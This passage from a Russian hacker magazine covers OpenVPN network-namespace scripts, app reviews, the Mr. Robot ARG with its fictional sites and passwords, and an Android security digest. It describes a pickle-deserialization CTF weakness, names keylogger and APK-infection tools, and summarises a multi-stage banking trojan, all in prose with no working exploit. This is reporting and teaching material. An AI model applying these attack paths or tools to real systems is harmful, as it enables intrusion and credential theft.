        /usr/sbin/ip ‐n $ns address add $ifconfig_local/30 dev $dev
        /usr/sbin/ip ‐n $ns link set $dev up mtu $tun_mtu
        [ ! ‐f /etc/netns/$ns/resolv.conf ] && mkdir ‐p /etc/netns/
$ns
        echo "nameserver $DNS1" > /etc/netns/$ns/resolv.conf
        echo "nameserver $DNS2" >> /etc/netns/$ns/resolv.conf
        ;;
    route‐up)
        /usr/sbin/ip ‐n $ns route add default dev $dev
        ;;
esac

Стоит помнить, что этот скрипт уже не подойдет для использования с openvp‐
n_netns.sh, поэтому рекомендую сохранить ovpn_control.sh для systemd
под другим названием, а также не забыть подправить его в openvpn_client.
conf. Посмотрим, как файлы .service работают на практике.
  Запускаем клиентский конфиг через systemd.


$ sudo systemctl start openvpn‐client@openvpn_client
$ sudo systemctl status openvpn‐client@openvpn_client
$ ip netns





            Запуск сервиса openvpn_client про шел успешно

Проверим, как дела у сервиса netns@openvpn_client:


$ systemctl status netns@openvpn_client.service

Но уже по пре дыдущему скриншоту можно ска зать, что все хорошо, так
как сервис виден в списке $ ip netns.





               netns@openvpn_client стартанул без проблем

Писать для systemd отдельный скрипт выполнения команд не вижу смыс ла,
так как это одностроч ник. :)


$ sudo ip netns exec openvpn_client ping ‐c 2 8.8.8.8
$ sudo ip netns exec openvpn_client curl ifconfig.co
$ sudo ip netns exec openvpn_client sudo ‐u eakj firefox &>/dev/null
&





                     Однострочники

Остановим клиент:


$ sudo systemctl stop openvpn‐client@openvpn_client.service

А затем убедимся, что netns не удалился (ip netns). Чтобы удалить, исполь‐
зуй команду


$ sudo systemctl stop netns@openvpn_client.service





  netns остается поднятым после оста новки клиентского OpenVPN‐сер‐
  виса


ЗАКЛЮЧЕНИЕ
Linux network namespaces — это мощный инстру мент, который с легкостью
позволяет изолировать сетевые ресурсы системы и может оказаться полез‐
ным не только для крупных проектов, но и дома. И описанный в статье трюк
с VPN — это лишь одно из возможных применений.
PCZONE





                       Андрей Письменный
                         Шеф‐редактор
                           apismenny@gmail.com



      TLDR PAGES — ЗАМЕНА СПРАВКЕ MAN, ПОКАЗЫВАЮЩАЯ
      ТОЛЬКО САМОЕ ВАЖНОЕ1        Что ты делаешь каждый раз, когда набира ешь команду man в Linux
        или Unix? Правиль но: тяжело вздыхаешь и морально готовишься
          к тому, что сейчас придется выискивать крупицы нужной информа‐
        ции в огромном полотне текста. Подробное опи сание нужно далеко
        не всегда: чаще всего дос таточно пары строчек.
         TLDR pages — это альтернатива для man, которая выводит лишь
         краткую справку с наибо лее полезными примерами. Ну, например,
        набираешь tldr ls и видишь, как делать вывод в стол бик, показы‐
         вать допол нительную информа цию, отоб ражать скры тые фай лы,
        сортировать по размеру и по дате и выводить размер фай лов
        в удобном для людей формате —  в килобайтах, мегабай тах
        и гигабайтах, если файл дос таточно большой. Стоп‐стоп, неуже ли
         всегда так можно было делать?!





        Если у тебя в системе есть Node.js, то для установки TLDR pages
        достаточно набрать npm install ‐g tldr. Если Node спе циально
        для этого ставить не хочет ся, то можешь попробовать альтернатив‐
       ные варианты: «клиенты» tldr портирова ны на все популярные скрип‐
        товые языки и ставятся через их менеджеры пакетов. Но будь осто‐
        рожен: сами файлы документации надо будет ставить отдельно,
        а  это  требует  некото рых  уси лий. Честно признаться, версию
        на Python мне так и не уда лось заставить видеть базу.
          Ну и на крайний случай есть вебовая версия TLDR pages — прос‐
         то впиши команду в поисковую стро ку сверху и нажми Enter. Удобно,
        если ты, например, сидишь на вин довой машине и под ключил ся
          к серверу на Linux удаленно.


      NOTION — НЕОБЫЧНАЯ СИСТЕМА ВЕДЕНИЯ ЛИЧНЫХ И
     КОМАНДНЫХ ЗАМЕТОК2       Приложений и сервисов для ведения заметок — не счесть. Однако
        способы работы, специфичес кие нужды и требования у каждого
        пользователя тоже свои. Для кого‐то важно мобильное приложение,
        для кого‐то — совместное редактирова ние, для кого‐то — воз‐
        можность добавлять к заметкам разные списки и чек‐лис ты. Ну
        а кому‐то подавай всё сра зу.





       Сервис Notion вклю чает в себя все вышепе речисленное. Заметки
        здесь хранятся в виде древовидной структуры, где каждая папка так‐
       же является стра ницей, на которую автомати чески добавляются
        ссылки на заметки, лежащие внутри. Notion отличается богаты ми
        возможностями по оформлению стра ниц: можно выбрать шаблон,
        поставить заглавную картинку, добавить к заметке картинки и видео
        и так далее.
         К редактирова нию легко пригласить коллег и в случае надоб‐
        ности — опубликовать отдельные заметки в виде веб‐страниц, что‐
       бы к ним был доступ без авто риза ции. К каж дой странице или даже
          к отдельному элементу можно добавить комментарий. Все это дела‐
         ет Notion интересным выбором для ведения документации в неболь‐
       ших командах.





       Напоследок — небольшая хитрость, которая касается авторизации.
        Зарегистрировать ся можно через почту или аккаунт Google. Во вто‐
       ром случае Notion зап росит доступ к контактам, но если отказаться,
         то будет предложено войти без этого. Увы, этот танец потом придет‐
        ся повторять каж дый раз.


      AIRMASH — МАСШТАБНОЕ ВОЗДУШНОЕ СРАЖЕНИЕ В
      ТВОЕМ БРАУЗЕРЕ3       Браузерные игры, которые сто ит только открыть, чтобы оказаться
        в пылу битвы, — это осо бо бес смысленная и беспощадная раз‐
        новидность таймкиллеров. Пару лет назад все просаживали время
        в Agar.io, но с тех пор появились новые достойные представители
       жанра.





      В Airmash тебе первым делом предлага ют ввес ти имя, выбрать один
        из трех регионов (обычно чем ближе сервер, тем меньше лагов)
        и режим игры: все про тив всех, захват флага или «царь горы». После
        этого  ты  оказываешься  за штурвалом  истре бителя и дол жен
        начинать уворачивать ся от вражес ких ракет и пускать свои одну
        за другой.
         На выбор — пять летательных средств, у каждого свои особен‐
         ности. Например, истребитель, который выдают по умол чанию,
       может ускорять ся, если зажать Shift, вертолет уме ет летать вбок,
        а стелс, понятное дело, коварно прячется. Все самолеты при этом
        с легкостью летают задом наперед, что выглядит забавно, но никак
        не мешает делу (даже помогает).





        Игра отлично работает в бра узере и изначально скачивает все‐
         го 2,8 Мбайт. Мне также удалось поиграть на iPad, но экранное
        управление не идет ни в какое сравнение с кнопками.
   СЦЕНА





                                                                            Андрей Письменный
                                                                                        Шеф‐редактор
                                                                                          apismenny@gmail.com


                 КАК НОВЫЙ СЕЗОН
            «МИСТЕРА РОБОТА» РАДОВАЛ
             ФАНАТОВ ПАСХАЛКАМИ
             И ХАКЕРСКИМИ ИГРАМИMR.ROBOT.S03



   Не важно, смотришь ты этот внезапно популярный сери ал
    про хакеров или нет: пасхалки, элементы игры в альтер‐
    нативную реальность и прочая сопутствующая раз влекуха
    в данном случае чуть ли не интереснее самого сюжета.
   В декабре закончился третий сезон «Мистера Робота» —
    самое время поговорить о том, что происходило в сери але
    и вокруг него.


    В ПОГОНЕ ЗА КУРОЧКОЙ
     20 июля 2017 года, выставка «Комик‐Кон» в Сан‐Диего. Перед главным вхо‐
    дом стоит группа протестующих с плакатами. При ближайшем рассмотрении
    можно увидеть, что не нравится им Ecoin — вымышленная криптовалюта
     из сериала Mr. Robot. Что ж, они протес туют не зря — ведь неподалеку откры‐
     лось целых два места, связанных с Ecoin.
      Одно из них — это банк E‐Corp (злой корпорации из сериала), где жела‐
    ющие могли, отстояв очередь, получить немного мерчендайза и кре дитную
     карту с десятью е‐монетами. С этой картой можно было отправиться в рас‐
     полагающийся неподалеку рес торанчик Red Wheelbarrow, который потом сыг‐
     рает большую роль в «Мис тере Роботе».





    Оба места, как несложно догадаться, открылись специально в качестве
     замаскированной рекламы сериала. На полученные е‐монеты в «Крас ной тач‐
     ке» посетители могли отведать гамбургер со свининой и выпить молочный
      коктейль. Но большинство людей шло туда не за этим, а для того, чтобы поис‐
      кать подсказки к ARG.


                INFO

                            Игры в альтернативной реальности  (Alternative
                                    Reality Games, ARG) — это не компьютерные и не
                             настольные игры, а нечто совершенно иное. Соз‐
                             датели «альтернативной реальности» придумы‐
                            вают загадки, создают сайты несуществующих
                           компаний, делают от их име ни рассылки и иногда
                           даже раскладывают подсказки в реальном мире,
                              оставляют записи на реальных автоответчиках
                           и устраивают другие развлечения. Игроки ищут
                             зацепки и идут по сле ду, распутывая детективный
                             сюжет.


    В подсказках недостатка не было, причем некоторые никуда не вели и только
     сбивали с толку ищущих — как, нап ример, висевшая на стене карта заведе‐
      ний, в которых якобы принимали Ecoin. Говорят, любители «Мистера Робота»
     успели подоставать их владельцев телефонными звонками. Еще всем, кто
     спрашивал о приеме на работу, сотрудники выдава ли бланки для запол нения.
       Ключ к следующему шагу на самом деле крылся в доске, на которой мелом
     была написана цитата из стихотворения Уильяма Карлоса Уильямса: «Так
    многое зависит от красной тачки, покрытой дождевой водой, стоящей возле
     белых цыплят».





    Можно было обратить внимание, что в рес торане висели изображения
     коровы, свиньи и курицы, а подавали только свиное блюдо и молочный кок‐
     тейль. Курица отсутствовала, зато нарисованный на дос ке цыпленок говорил:
      «Follow us».
         Те, кто догадался выйти на улицу и поискать другие изображения кур,
     не были разочарованы. Следуя от одного к другому, игроки находили пла‐
      каты, на каждом из которых была спрятана часть телефонного номера.





              Закрытый магазин Mr. Robot, который встречался по пути

    Номер пришлось набирать много и часто: большинс тво звонков сры вались
     или никто не отвечал. Но если уда валось доз вониться, то голос в трубке
     называл первую часть клю чевой фра зы с плакатов. В ответ требовалось наз‐
     вать вторую. Звучало это примерно так: «Если потянуть за нужные веревоч‐
     ки…» — говорит голос из трубки, а игрок отвечает: «Марионетка запляшет
      как тебе угодно».
        Тем, кто отве тил верно, сооб щали время и мес то, в которое нужно явиться
     на следующий день. На ука занном перекрес тке участников приключения ждал
     парень в черном балахоне. Он просил предъ явить заполненный бланк соис‐
      кателя, после чего пред лагал пройти за ним.
       Вот тут начинается самый захватыва ющий момент. Игрока провожали
     обратно к «Красной тачке», но подводили не к основному входу, а с задней
     стороны — к дверям, ведущим в подвальное помещение. Попросив времен‐
     но оставить мобильный телефон, игрока пускали внутрь.
       Темное подвальное помещение полностью повторяло сцену, в которой
     Анджела ждала звонка от Белой Розы. Тот же стол со старинным Commodore
      64, тот же аквариум, та же красная телефонная трубка. За компьютером
     сидел человек, одетый в костюм головореза «Темной армии», — как и
     положено, в маске демона.





              В сериале воп росы задавала малень кая девочка

    Он задавал игроку несколько вопросов, точно так же, как их задавали Андже‐
      ле. «Во сколько лет ты осознал, что оди нок?», «Рас тение, минерал или живот‐
     ное?», «Боишься ли ты темноты?». Отвечать на все вопросы можно было
      как угодно, кроме последнего — на него требовалось нес колько раз подряд
     дать отрицательный ответ.
        «Тогда смотри», — говорит человек в мас ке, выключает свет и включает
      ультрафиолетовую лампу. На стене напротив загора ются граффити: какие‐то
      цитаты, изображение белой розы и крупными буквами слова «Чего желают те,
      кто во тьме?». Игрок отвечает: «Света», граффити тухнут, и свет загорается
     над аквариумом. Телефон на сто ле звонит.





    Подняв трубку, игрок слышит голос Белой Розы. Она сообщает, что выделила
     на этот звонок в точ ности минуту и двадцать семь секунд и просит не переби‐
      вать. Затем читает длинный монолог о том, что падение E‐Corp было только
     началом и что до конца суждено дожить не всем, намекая на грядущие
     события в сериале. Слы шен звук таймера, и звонок заканчивается.
       Под конец игроку выдают конверт и предлагают взгля нуть на фотографии
     в нем. Это фото со съемок третьего сезона: Эллиот перед логотипом E‐Corp,
      куртка Mr. Robot, Дарлен в компании азиатско го мужчины и так далее.
     Забирать фотографии не разрешают. На выходе игроку молча возвращают
     его телефон, на чем квест и заканчивается.


          WWW

                          Полные  отчеты  очевидцев  можно  почитать
                             на Reddit: первый и второй. Есть и фотографии.



    ВЕЧЕРИНКА В СТИЛЕ MR. ROBOT
     Квест на «Комик‐Коне» в Сан‐Диего пока что был одним из самых кру тых эпи‐
     зодов ARG, но он далеко не единственный. Сравнимый трюк соз датели «Мис‐
     тера Робота» провернули 5 октября — на этот раз на нью‐йоркском
     «Комик‐Коне».  Для  нес кольких  сотен  поклонников  сериала  устроили
     «вечеринку запуска Ecoin». Их жда ло шампанское и канапешки.





     Для некоторых гостей (предположительно — игро ков в ARG) приготовили
     иное развлечение: к ним незаметно подходили и приглашали выйти на пар‐
      ковку и найти черный фургон. Отту да их отправляли на «миссию»: требова‐
     лось приклеить плакат  Fsociety, нанес ти граффити или еще что‐нибудь
     в таком духе.





    В середине вечерин ки выступление главы E‐Corp было прервано отключени‐
    ем света. Когда загорелись крас ные лампы, повсюду были развешаны бан‐
     неры Fsociety, гигантскую букву E, висевшую в центре зала, спустили вниз,
     на сцене появились люди в мас ках.





     Зрители не отставали и тоже понадевали мас ки, которые им были выданы
     заранее. Закончилось все показом трейлера третьего сезона.


          WWW

                          Подробнее о вечерин ке можно почитать на mtv.‐
                            com, больше фото — на сайте USA Network.



    YOU’VE GOTTA BE FUCKING KIDDING ME
    Обычно в ARG решение одной загадки ведет к дру гой и игроки движутся
     по так называемой «тро пе» (trail). В ARG Mr. Robot все слегка по‐другому:
     троп множество и они быстро заканчиваются. Начало — это обычно ссылка
     или IP, подсмотреть которые можно в самом сериале, если внимательно изу‐
      чать кадры с экранами. Концовка и награда — какой‐нибудь допол нительный
     материал к сериалу.
       Один из излюблен ных приемов создателей «Мис тера Робота» — это под‐
     дельные шеллы и рабочие столы, взаимодейство вать с которы ми игроки
     могут через браузер. На время показа третьего сезона основным местом
     для таких развлечений стал сайт whoismrrobot.com (или WIMR, как его стали
     сокращать). Здесь сконцентрирова на мас са всего интересного, и по мере
     выхода новых серий эта коллекция пополняется.





     Большая часть материалов собрана в папке Origin. К примеру, отсюда можно
     запустить игру endgame, которая уже сыграла свою роль в ARG год назад.
     Есть и кое‐что новенькое, например нес колько стра ниц из романа «Пляжное
     полотенце», который в сериале пишет Ирвинг.





    Лю бители старых компьютеров оценят эмулятор Commodore 64.


                                            Продолжение статьи →
СЦЕНА               ← НАЧАЛО СТАТЬИ
       MR.ROBOT.S03
               КАК НОВЫЙ СЕЗОН «МИСТЕРА РОБОТА»
                  РАДОВАЛ ФАНАТОВ ПАСХАЛКАМИ
                       И ХАКЕРСКИМИ ИГРАМИ





На нем можно поиграть в игру Land of Ecodelia — ту самую, что Анджела видит
в темной комнате. Для этого нужно наб рать


LOAD"$",8
LIST
LOAD "Land of Ecodelia",8
RUN

Все остальные игры, увы, не работа ют — это просто отсылка к Радужной
серии. Собственно, и Land of Ecodelia — это не игра, а сборник странных воп‐
росов и красивых картинок.





Зато тут скрыта еще одна небольшая загадка: если взять под све ченные жел‐
тым буквы из вопросов и сложить их, то получится пос ледовательность cmVh‐
bA. Декодируем из Base64 и получа ем слово real. Его можно ввести в тер‐
минале на whoismrrobot.com и получить вот такой ответ.





Вот так не особенно зрелищно заканчивается одна из многих троп этой ARG.


Дру гие инте рес ные сай ты
 • https://my.e‐coin.com/ — сайт Ecoin.
 • https://www.red‐wheelbarrow.com — сайт «Красной тачки».





 • https://www.reddit.com/r/inside_e_corp/  —   поддельный   подреддит,
   на котором во вто ром эпизоде общаются сот рудники E‐Corp.
 • https://webmail.e‐corp‐usa.com/owa/ —  почта  E‐Corp.  Логин RETRO
   и пароль PORTAL, полученные игроками, позволя ют скачать PDF с презен‐
   тацией Эллиота.





 • https://www.e‐corp‐usa.com/cp/directory/shipping/1088989/ — служба дос‐
   тавки E‐Corp. Подходящие логин и пароль так и не были найдены.
 • https://y9bukwer.bxjyb2jvda.net/ или 192.251.68.238 — IP‐камера, через
   которую Тайрелл смотрел на своего ребенка. Ребенка больше не показы‐
   вают (что логично), но из белого шума игрокам удалось дос тать фразу
   «we’re all mad here» («Все мы здесь не в своем уме») из «Алисы в Стране
   чудес».





         Сейчас можно посмотреть только на надпись Stream error

 • https://www.amazon.com/gp/product/B076K7QL3V — небольшой текстовый
   квест, выполненный в качес тве скилла для Amazon Echo.
 • https://y8agrfx3.bxjyb2jvda.net — поддельный фай ловый браузер Ubuntu
   на китайском. В папках можно найти картинку с дес ктопом и пиктограмму
  маски. Пиктограмма в реальности гигант ская, в одном из пикселей нашли
   очередную цитату из «Алисы в Стра не чудес».





 • https://ycg67gca.bxjyb2jvda.net/app/kibana/#/dashboard/Priority‐Host_Moni‐
   toring — сайт с результатами мониторин га Kibana. Ничего ценного на нем
   пока не найдено.
 • https://yakkqwhz.bxjyb2jvda.net — псевдотерминал с дос тупом к аппарат‐
   ному криптографичес кому модулю E‐Corp. Наб рав пароль z1on0101 и PED
   022350, принадлежащие сотруднику E‐Corp Фрэнку Боуме ну, можно уви‐
   деть то же, что видела Анджела, копируя ключи подписи для прошивки
   к ИБП.





 • https://ycg67gca.bxjyb2jvda.net/ﬁles/ups_640_patch.zip —  патч прошивки
  ИБП. Игрокам не без труда удалось выудить из него оче редную цитату
   из «Алисы в Стране чудес»: «Надо бежать как минимум вдвое быс трее».
 • http://i242.bxjyb2jvda.net — терминал на компьютере, с которого Эллиот
   обновлял про шивку ИБП. Наб рав ту же пос ледовательность команд, что
   и он, можно прой ти через его экспириенс. Вот команды:


   unzip ups_fw_patch.zip
   gpg ‐‐verify hashes.asc
   sha256sum ‐‐check hashes.asc
   scp apc* upsadmin@192.251.68.229:/upsfw
   ssh upsadmin@192.251.68.229


 • http://yac9cl78.bxjyb2jvda.net или 192.251.68.229 — терминал, изобража‐
  ющий SSH на источнике бесперебойного питания.





 • 192.251.68.228 —  IP, засвеченный в девятом эпизоде. Файл index —
   это зазипованная картинка в Base64. Раскрыв, можно увидеть две розы.
  А еще здесь по методу LSB застеганографиро ван код.





 • 192.251.68.236 — веб‐админка C&C‐ботнета «Темной армии». Используя
   логин garyhost из сери ала и код из картинки с розой в качестве пароля,
  можно зайти внутрь и пос мотреть. Если выписать названия достопримеча‐
   тельностей по указанным геокоординатам, получа ется слово CATOPTRIC.





   Его можно использовать в качестве пароля на сайте whoismrrobot.com
   для доступа к китайскому дес ктопу DA_remote. Там, помимо прочего, есть
   аудиозапись звонка Белой Розы.





 • https://www.dropbox.com/s/0cp05oezsolrn4d/ — файл с парой геокоор‐
   динат, которые указывают на мес то в пус тыне недалеко от границы между
   Конго и Анголой (со стороны Конго). Съез дить и посмотреть, не под‐
   ложили ли там чего‐нибудь создатели сериала, никто пока не отважился.




CAPTURE THE FLAG
Все, что в «Мистере Роботе» показывают на экра нах компьютеров, более
или менее реально. Да, уязвимос ти, которы ми поль зуются персонажи, иногда
не самые свежие, но это не меша ет раз глядывать стоп‐кадры и выис кивать
знакомые вещи.
  Первая серия третьего сезона в этом пла не порадовала особенно. В ней
Эллиот, лишенный компь ютера, заходит в подвал, где проводится сорев‐
нование нью‐йоркской группы DEF CON. Эллиоту нужно все го лишь сесть
за свободный компьютер, чтобы занять ся сво ими важными делами. Но чтобы
его пустили за клавиатуру, приходится в срочном порядке помочь участнику
CTF справиться с заданием.





Казалось бы, реализм так себе — все потеют над заданием кучу времени,
а наш компьютер ный гений решает его за пару минут. Но сама задачка,
как оказалось, не выдумана для сериала, а вполне настоящая. Мало того,
зрителям предоставляется возможность скачать ее и решить самостоятель‐
но!





Если ты еще не успел закрыть whoismrrobot.com, запускай терминал в раз‐
деле Origin и посмотри, что выводит ls. Среди скрытых папок есть ctf —
заходим и открываем файл minesweeper.py при помощи open (другие при‐
вычные команды не работают).
  Копируем себе содержимое, сохраня ем в файл и запускаем его в Linux
или macOS.


           WARNING

                    По сути, ты запускаешь у себя шелл: скрипт
                       заведомо уязвим и держит открытый порт. Убе‐
                         дись, что он недоступен извне, а не то в ботнете
                      «Темной армии» станет одной машиной больше
                         (последнее — шутка… скорее всего).


Скрипт будет принимать команды на порте 1024, так что открывай еще один
терминал и подключайся:


$ netcat localhost 1024

Ура, можно играть в «Сапера» из командной стро ки! Команда o x, y (где x
и y — координаты от 1 до 15) открывает клетку, команда f x, y ставит флаг, s
выдаст строку сейва, l вос ста новит из нее игру, а q или x — выход.


                                     Продолжение статьи →
СЦЕНА               ← НАЧАЛО СТАТЬИ
       MR.ROBOT.S03
               КАК НОВЫЙ СЕЗОН «МИСТЕРА РОБОТА»
                  РАДОВАЛ ФАНАТОВ ПАСХАЛКАМИ
                       И ХАКЕРСКИМИ ИГРАМИ





Но поскольку это CTF, настоящая победа не в том, чтобы открыть все поле,
а в том, чтобы получить флаг, то есть уда лен но счи тать произвольный файл.
Как это сделать? В сериале Эллиот говорит участнику: «Тебе позволя ют сох‐
ранять и загружать игру, что бы восста новить все мины и откры тые клетки.
В этом и состоит уязвимость. Игра верит тем данным, что ты ей дашь, чтобы
восстановить доску. Отрави данные, и можешь запускать любой код».
   Участник не верит: «Я уже пробовал. Не выходит. Сервер подписывает
сейвы своим ключом, и без него не сойдется контрольная сумма». На что
Эллиот отве чает: «Поэто му придется играть в игру, пока не найдешь все
мины. Потом, зная доску, ты сможешь вычислить ключ. Ну и ты уже заметил
уязвимость перед инъекцией кода в хендлере функции сохранения, правда?»
  Все это — не выдуманная режиссером око леси ца, как оно бывает в других
фильмах,  а  настоящие  подсказки.  Игра  маршализует  объект  доски
при помощи питоновской функции pickle, а ее при желании можно зас тавить
выпол нять  что угодно. Ключ зашиф рован при помощи XOR, а значит,
вытащить его можно, просто восстановив исходную строку (состояние дос ки)
и передав на сервер.
   Если ты хочешь удовлетво рить любопытство, не решая задания, можешь
посмотреть все подробнос ти в треде на Reddit. Кстати, создатели сериала
позаимствовали задачку на нас тоящем CTF, так что по ней есть це лых три
райтапа.


АДДОН РАЗДОРА
Как известно, многие интересные вещи в «Мистере Роботе» происходят не во
время выхода новых серий, а между сезонами. Например, опи санные выше
события на двух «Комик‐Конах» предшес твовали третьему сезону. Пос ле его
окончания тоже появилось кое‐что интересное. На этот раз, правда, не обош‐
лось без скандала.
  В середине декабря 2017 года мно гие поль зователи браузера Firefox
обнаружили, что у них уста новлен и активиро ван аддон Looking Glass 1.0.3.
Его описание в тот момент звучало не очень‐то убедительно: «Моя реаль‐
ность отличается от тво ей» заг лавными буквами.





Внезапное появ ление неизвес тного аддона успело вызвать небольшой
переполох — пока не выяс нилось, что это про моушен «Мистера Робота»
и расширение, по сути, без вредно. Все, что оно делает, — добавляет свою
строку в заголовок HTTP на двух сайтах (red‐wheelbarrow.com, а именно раз‐
дел For Kids и whatismybrowser.com), а также средствами CSS заставля‐
ет 72 слова из списка время от времени вращать ся вокруг горизонтальной
оси (список есть в исходниках).
   Вскоре последовали недоволь ные выпады в адрес Mozilla: зачем, мол,
подсовываете нам рекламу? Что бы такого не повторялось, нужно выключить
Firefox Studies в настройках. Но нам сейчас интересно другое: что меня ется
на сайте «Красной тачки», если смотреть с аддоном?
  На первый взгляд — ничего.





Но если открыть первый листок (в ресторанах такими штуками развлекают
детей, чтобы взрослые могли спокойно поесть), то в глаза могут броситься
некоторые отличия — например, цвет футболки маль чика в нижнем углу изме‐
нил ся. А на плакате чуть выше — самое интересное, двоичный код.





Всего есть три варианта этой картинки: для Firefox с активным плагином,
для Firefox без плагина и для дру гих браузеров. Если сложить все три час ти
и сначала перевести коды в десятичную систему, а затем подставить вместо
чисел буквы с соот ветс твующим порядковым номером в алфавите, то
получатся слова REINDEERFLOTILLA. Это не просто отсылка к фильму Tron —
эти слова еще пригодятся.


ИГРА ПРОДОЛЖАЕТСЯ!
Раздел DA_remote на whoismrrobot.com хранит один важный секрет. Заходим
туда (пароль — CATOPTRIC). В папке Documents есть файл epilogue.docx
с концовкой «Пляжного полотенца». Здесь интересен самый конец, где упо‐
мянута семафорная азбука и особо выделено слово destiny («судьба»).
   Если открыть терминал и ввести destiny  (это, кстати, единс твенная
работающая команда), то нас перекинет на сайт «Красной тачки», но не
на главную, а на страницу с огромными часами.





Игроки, немало попотев, догадались сна чала записать destiny на языке
семафоров, а затем принять положение флагов в каждой букве за стрелки
часов. Полученные значения времени вво дим на часах, каждый раз под‐
тверждая кнопкой Set, и смотрим заставку.





В конце нас возвращает на главную страницу, но теперь есть видимое отли‐
чие: мы как бы залогинены. «Как бы», потому что если нажать на появившуюся
кнопку Network Map, то все равно спросят пароль пользовате ля admin.
Хорошая  новость  заключа ется  в  том,  что мы  его  уже  знаем, —
это REINDEERFLOTILLA.





Теперь перед нами карта сети Red Wheelbarrow. Нажать здесь ничего нельзя,
зато можно подметить, что файрвол подписан как /vincent. Отлично!
Переходим на red‐wheelbarrow.com/vincent и видим очередную фор му логина.
  Самым пытливым игрокам уже уда лось подоб рать логин и пароль. Под‐
сказки к ним скрываются на непримет ной стра нице с лицензией. В замыс‐
ловатом юридическом тексте спря таны отсылки к фильму 1979 года «Черная
дыра», намек на цитату из Цицеро на, которая была использована в фильме,
и даже на то, как именно ее вводить, — строчными буквами без пробелов.


логин: cicero
пароль: rashnessisthecharacteristicofyouthprudencethatofmellowedagea
nddiscretionthebetterpartofvalor

Однако оказывается, что главное предназна чение этого сайта — доступ
к другим запаролен ным ресурсам: IDS, Proxy, DHCP/RTR и Honeypot (о,
как много хакеров ему предстоит собрать!). Отту да, судя по карте сети, мож‐
но пробраться к четырем базам данных, почтовому и веб‐серверу, трем ноут‐
букам и FTP. Как это сделать? Где искать пароли? Пока что никто не догадал‐
ся, так что у тебя есть шанс стать первым.
  Одна оговорка: наверняка вскоре пос ле публикации статьи (а то и до нее)
найдутся новые зацепки. Так что преж де, чем брать ся за самостоятельное
расследование, не забудь проверить, как идут дела у сообщес тва. Успешных
поисков!


        WWW

                    •Подреддит, посвященный сериалу
                    •Подреддит,  координирующий  разгадывание
                         задачек ARG
                      •Пост со всеми актуальными находками
                    •Вики, где тоже собирают информацию о зацеп‐
                           ках
                    •Подробности об актуальных загадках
X‐MOBILE

 МОБИЛЬНЫЙ
  ДАЙДЖЕСТ
   НОЯБРЯ





                                          Евгений Зобнин
                                            Редактор Unixoid и Mobile
                                                     zobnin@glc.ru





Сегодня в выпус ке: универсальные прошивки Android 8, мно‐
гоголовые трояны и чат‐боты, кликботы, эксплуатация уве‐
домлений Android, взлом приложе ний через доверенные
компоненты и, конечно же, маленький сетевой пентест —
как  заставить приложения  доверять  нам.  Кодинг  тоже
не забыли: советы, библиотеки и Kotlin, мы любим его.


ПОЛЕЗНОЕ
 • Cloak‐And‐Dagger — исходники одной из атак класса Cloak & Dagger over‐
     lay. Это keylogger, реализованный с помощью SYSTEM_ALERT_WINDOW;
 • personal_script — набор авторских скриптов для IDA Pro, Frida, Burp Suite
   и 010 Editor;
 • krackattacks‐scripts — набор скриптов для проверки устройств и точек дос‐
   тупа на уязвимость KRACK;
 • Evil‐Droid — инструмент для внедрения зловредного кода в при ложе ния
   под Android;
 • Droidefense — инструмент ана лиза малвари, привлекающий множество
   различных инструментов для раз бора APK.





                                Droidefense


ПОЧИТАТЬ
Project Treble и раз витие ядра Linux
Project Treble Brings Extended Linux Kernel Security Support to Combat Fragmen‐
tation — инте ресная история о том, как Google с помощью Android меняет всю
экосистему Linux и осно ванных на нем устройств.
   Суть в том, что у ядра Linux есть специальные LTS‐версии, срок поддержки
которых составляет два года. Новой функциональнос ти в них не появляется,
но баги продолжают исправлять ся. Эти LTS‐версии используют разработчики
серверных дистрибутивов Linux (потому что большое обновле ние ядра может
что‐то сломать), а также производители Android‐устройств, а точнее SoC
(потому что портировать новую версию ядра на SoC — не самая простая
задача).
   Так вот, Google догово рилась с Linux Foundation о том, чтобы поддержка
LTS‐версий ядра продол жалась не два года, а целых шесть лет. Это означает,
что мы можем рассчитывать на лучшую поддержку устройств со стороны про‐
изводителей (теперь им не придется самим исправлять ошибки в уже не под‐
держиваемых LTS‐ядрах), а также поддержку дру гой техники, основанной
на Linux (роуте ры, лампочки и про чий  IoT). Ну и конечно же, это очень
хороший знак для разработчиков серверных редакций дистрибутивов Linux.


Универсальные про шивки Android 8
A Revolution in Custom ROMs: How Project Treble makes Porting Android Oreo a 1
Day Job — интересная статья о том, насколько Project Treble упрощает пор‐
тирование прошивок на устройство.
   Напомню, что Project Treble — это инициатива Google, призванная уни‐
фицировать внутренние компоненты Android, которая дол жна четко разделить
ОС на две независимые части: одна будет вклю чать в себя ядро, драйверы
и другие компоненты, необходимые для поддержки железа, а вторая — сам
Android.
   Идея в том, что интерфейс между этими дву мя частями должен быть жес‐
тко определен и не изменяться со временем. Это позволит гораздо быстрее
портировать новые версии Android на ста рые устройства: в теории ничего
даже не нужно портировать, достаточно взять образ новой версии Android
и прошить его на устрой ство.
  До практики же дело пока не дошло — наработки Treble впервые появи‐
лись в Android 8, последней версии ОС на данный момент. Зато на Android
8 работает уже несколько разных смартфонов с сильно отличающимися
сборками Android. Что, если просто взять Android с одного смартфона
и запустить его на другом? Поможет ли Treble здесь?
   Как оказалось — да. Пользователь phhusson с форумов XDA за двадцать
часов создал образ Android, который можно без всяких модификаций заг‐
рузить на разных устройствах: Huawei Mate 9, 8 Pro, Honor 9, Sony Xperia XZ1
Compact и Essential Phone (три разных произво дителя и два раз ных чипсета:
HiSilicon Kirin 960 и Qualcomm Snapdragon 835).
   Это означает, что в будущем вместо огромного количества сборок
какой‐либо кастомной прошивки Android для каж дого устройства (каждая
из которых требует десятков часов для портирования) мы увидим одну общую
прошивку, которую можно будет установить на любой смартфон. Нечто срод‐
ни Linux или Windows: скачал с сайта и установил на любой смартфон.


Мно гого ловый тро ян в Google Play
Multi‐stage malware sneaks into Google Play — раз бор трояна Android/Trojan‐
Dropper.Agent.BKY, использующего технику скры тия от антивирусов и сис тем
безопасности Google Play с помощью разделения на нес колько стадий.
   Сразу после запуска троян незаметно для пользователя рас шифровывает,
извлекает и запускает свою первую стадию, которая затем расшифровывает
и запускает вторую. Она, в свою очередь, ска чивает новое приложение с ука‐
занного URL и инициирует установку. Если пользователь соглашается уста‐
новить и запустить APK (который выда ет себя за Adobe Flash Player), рас‐
шифровывается и запус кается четвертая ста дия.
   Четвертая стадия представляет собой классический банковский троян,
который выводит на экран окна оверлеи с целью похитить учетные данные
пользователей.
   Интересно, что благодаря тому, что для скачивания четвертой стадии
используется bit.ly, исследова телям удалось узнать, сколько всего было обра‐
